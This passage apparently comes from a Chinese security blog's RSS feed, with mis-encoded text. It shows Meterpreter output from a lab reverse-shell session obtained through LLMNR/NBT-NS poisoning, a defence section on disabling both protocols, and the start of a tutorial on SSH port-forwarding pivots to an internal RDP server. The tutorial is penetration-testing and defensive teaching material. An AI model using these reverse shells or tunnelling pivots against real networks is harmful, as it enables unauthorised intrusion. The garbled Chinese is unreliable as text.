&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;201308&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-02-14 10:42:49 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; sysinfo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Computer        : WIN-JH8N3KV3OQ0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS              : Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6.1 Build 7601, Service Pack 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Architecture    : x64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System Language : en_US
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain          : HACK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logged On Users : &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Meterpreter     : x64/windows
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x04-é˜²å¾¡&#34;&gt;0x04 é˜²å¾¡&lt;/h1&gt;
&lt;p&gt;ä¸»è¦è¿˜æ˜¯å…³æ‰&lt;strong&gt;LLMNR&lt;/strong&gt;å’Œ&lt;strong&gt;NBT-NS&lt;/strong&gt;ï¼Œå¦‚æœåªå…³é—­å…¶ä¸­ä¸€ä¸ªä¹Ÿä¼šè¢«æ”»å‡»æˆåŠŸï¼Œæ‰€ä»¥éƒ½è¦å…³æ‰æ‰è¡Œï¼Œ&lt;/p&gt;
&lt;h2 id=&#34;å…³é—­llmnr&#34;&gt;å…³é—­LLMNR&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;win+Rè¾“å…¥gpedit.msc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰¾åˆ°è·¯å¾„Local Computer Policy -&amp;gt; Computer Configuration -&amp;gt; Administrative Templates -&amp;gt; Network -&amp;gt; DNS Client&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰¾åˆ°&lt;strong&gt;Turn Off Multicast Name Resolution&lt;/strong&gt;ï¼Œç‚¹å‡»enableå³å¯&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å…³é—­netbios&#34;&gt;å…³é—­NetBIOS&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æ‰“å¼€ç½‘ç»œå…±äº«ä¸­å¿ƒ&lt;/li&gt;
&lt;li&gt;ç‚¹å‡»æ›´æ”¹é€‚é…å™¨è®¾ç½®&lt;/li&gt;
&lt;li&gt;é€‰æ‹©æŒ‡å®šçš„ç½‘å¡ï¼Œå³é”®å±æ€§&lt;/li&gt;
&lt;li&gt;é€‰æ‹©Internet åè®®ç‰ˆæœ¬ 4 (TCP/IPv4)&lt;/li&gt;
&lt;li&gt;ç‚¹å‡»é«˜çº§&lt;/li&gt;
&lt;li&gt;é€‰æ‹©WINSé€‰é¡¹ï¼Œç‚¹å‡»ç¦ç”¨TCP/IPä¸Šçš„NetBIOS&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¿®å¤ç»“æœ&#34;&gt;ä¿®å¤ç»“æœ&lt;/h2&gt;
&lt;p&gt;å…³é—­ä¸¤è€…åå†å°è¯•å›å‡ºç°é”™è¯¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x05-å‚è€ƒ&#34;&gt;0x05 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/&#34;&gt;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/&#34;&gt;https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://apt404.github.io/2016/07/24/llmnr-wpad/&#34;&gt;https://apt404.github.io/2016/07/24/llmnr-wpad/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>SSHéš§é“æŠ€æœ¯ç ”ç©¶å’Œå®æˆ˜</title>
      <link>https://xxe.icu/ssh_tunnel.html</link>
      <pubDate>Thu, 10 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ssh_tunnel.html</guid>
      
        <description>&lt;h2 id=&#34;0x00-ç®€ä»‹&#34;&gt;0x00 ç®€ä»‹&lt;/h2&gt;
&lt;p&gt;åœ¨å†…ç½‘ä¸­ï¼Œå‡ ä¹æ‰€æœ‰çš„LinuxæœåŠ¡å™¨éƒ½ æ”¯æŒSSHåè®®ï¼Œä¸€èˆ¬æƒ…å†µä¸‹SSHçš„ç«¯å£åè®®æ˜¯å…è®¸é€šè¿‡é˜²ç«å¢™çš„ï¼Œæ‰€ä»¥ä¼šç»å¸¸è¢«æ”»å‡»åˆ©ç”¨ã€‚è€Œä¸”ï¼ŒSSHåè®®çš„ä¼ è¾“è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆéš¾åœ¨æµé‡åˆ†æä¸­åŒºåˆ«æ˜¯å¦æ˜¯è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œæ”»å‡»è€…ä½¿ç”¨SSHåè®®ä½œä¸ºéš§é“çªç ´é˜²ç«å¢™åï¼Œå¯ä»¥å»ºç«‹ä¸€äº›TCPè¿æ¥è¿›è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x01-åŸºç¡€æ“ä½œ&#34;&gt;0x01 åŸºç¡€æ“ä½œ&lt;/h2&gt;
&lt;p&gt;è½¬å‘éœ€è¦çŸ¥é“çš„å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-f ï¼šå°†sshä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰çš„shell
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Nï¼šå»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“çš„ä¼šè¯ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Dï¼šåŠ¨æ€è½¬å‘ï¼ˆsocksä»£ç†ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Pï¼šæŒ‡å®šsshç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;1æœ¬åœ°è½¬å‘&#34;&gt;1ã€æœ¬åœ°è½¬å‘&lt;/h3&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§ä¸ºæ”»å‡»è€…çš„VPSï¼Œä¸­é—´æ˜¯ä¸€å°é˜²ç«å¢™ï¼Œå³ä¾§åˆ™æ˜¯ä¸€ä¸ªå°å‹çš„å†…ç½‘ï¼›å¤–éƒ¨çš„VPSèƒ½è®¿é—®å†…ç½‘çš„WebæœåŠ¡å™¨ï¼Œä½†ä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ•°æ®åº“å’ŒWebæœåŠ¡å™¨èƒ½äº’ç›¸è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„ç›®æ ‡æ˜¯ï¼š&lt;strong&gt;ä»¥WebæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œè®¿é—®å†…ç½‘ä¸­æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªéœ€è¦æŠŠæ•°æ®åº“æœåŠ¡å™¨172.16.0.106çš„3389ç«¯å£æ˜ å°„åˆ°VPSä¸Šçš„1152ç«¯å£ï¼Œå†è®¿é—®VPSçš„1152ç«¯å£å°±å¯ä»¥è®¿é—®æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨VPSä¸Šæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -CfNg -L 1152(VPSç«¯å£):172.16.0.106(æ•°æ®åº“æœåŠ¡å™¨IP):3389(æ•°æ®åº“æœåŠ¡å™¨ç«¯å£) web@172.16.0.108(WebæœåŠ¡å™¨)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œåè¾“å…¥å¯†ç å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ ssh -CfNg -L 1152:172.16.0.106:3389 web@172.16.0.108                                                                                                                                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@172.16.0.108&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥åœ¨VPSæŸ¥çœ‹ä¸‹ç›‘å¬çš„ç«¯å£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ netstat -tunlp                                                                                                                                                                                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:1152            0.0.0.0:*               LISTEN      935867/ssh          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::1152                 :::*                    LISTEN      935867/ssh          
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬åœ¨VPSä¸‹å¯ä»¥ç”¨remminaè¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥&lt;code&gt;127.0.0.1:1152&lt;/code&gt;ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»å¯ä»¥è®¿é—®æ•°æ®åº“æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°è®¿é—®1152ç«¯å£ï¼Œå°±æ˜¯é€šè¿‡sshåè®®å°†æ•°æ®ä¼ è¾“åˆ°è¿œç¨‹ç«¯å£3389ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä»webæœåŠ¡å™¨(172.16.0.108)çš„IPè¿›è¡Œç™»å½•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Users\test\Desktop&amp;gt;netstat -ano | findstr &amp;#34;3389&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  TCP    172.16.0.106:3389      172.16.0.108:57100     ESTABLISHED     1000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  TCP    [::]:3389              [::]:0                 LISTENING       1000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  UDP    0.0.0.0:3389           *:*                                    1000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  UDP    [::]:3389              *:*                                    1000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2è¿œç¨‹è½¬å‘&#34;&gt;2ã€è¿œç¨‹è½¬å‘&lt;/h3&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§ä¸ºæ”»å‡»è€…çš„VPSï¼Œä¸­é—´æ˜¯ä¸€å°é˜²ç«å¢™ï¼Œå³ä¾§åˆ™æ˜¯ä¸€ä¸ªå°å‹çš„å†…ç½‘ï¼›å¤–éƒ¨çš„VPSä¸èƒ½è®¿é—®å†…ç½‘çš„WebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨ï¼Œæ•°æ®åº“å’ŒWebæœåŠ¡å™¨èƒ½äº’ç›¸è®¿é—®ï¼Œ&lt;strong&gt;ä½†WebæœåŠ¡å™¨å¯ä»¥è®¿é—®VPS&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„ç›®æ ‡æ˜¯ï¼š&lt;strong&gt;ä»¥WebæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œè®¿é—®å†…ç½‘ä¸­æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€æ ·æ˜¯ä»¥WebæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œé€šè¿‡è®¿é—®VPSçš„1152ç«¯å£å°†æ•°æ®ä¼ è¾“åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£ï¼Œä¸ä¸Šé¢ä¸åŒçš„æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ˜¯åœ¨WebæœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;VPSä¸ç”¨æ“ä½œï¼Œæˆ‘ä»¬åªåœ¨WebæœåŠ¡å™¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¾“å…¥vpsçš„å¯†ç å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -CfNg -R 1152&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSç«¯å£&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:172.16.0.106&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;æ•°æ®åº“æœåŠ¡å™¨IP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:3389&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;æ•°æ®åº“æœåŠ¡å™¨ç«¯å£&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; kali@172.16.0.107&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬åœ¨VPSæœåŠ¡å™¨æŸ¥çœ‹ç«¯å£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ netstat -tunlp                                                                                                                                                                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:1152            0.0.0.0:*               LISTEN      935867/ssh          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::1152                 :::*                    LISTEN      935867/ssh      
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬åœ¨VPSä¸‹å¯ä»¥ç”¨remminaè¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥&lt;code&gt;127.0.0.1:1152&lt;/code&gt;å°±å¯ä»¥è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;3åŠ¨æ€è½¬å‘&#34;&gt;3ã€åŠ¨æ€è½¬å‘&lt;/h3&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§ä¸ºæ”»å‡»è€…çš„VPSï¼Œä¸­é—´æ˜¯ä¸€å°é˜²ç«å¢™ï¼Œå³ä¾§åˆ™æ˜¯ä¸€ä¸ªå°å‹çš„å†…ç½‘ï¼›å¤–éƒ¨çš„VPSèƒ½è®¿é—®å†…ç½‘çš„WebæœåŠ¡å™¨ï¼Œä½†ä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ•°æ®åº“å’ŒWebæœåŠ¡å™¨èƒ½äº’ç›¸è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„ç›®æ ‡æ˜¯ï¼š&lt;strong&gt;ä»¥WebæœåŠ¡å™¨ä½œä¸ºè·³æ¿å»ºç«‹socksä»£ç†ï¼Œè®¿é—®å†…ç½‘ä¸­æœåŠ¡å™¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
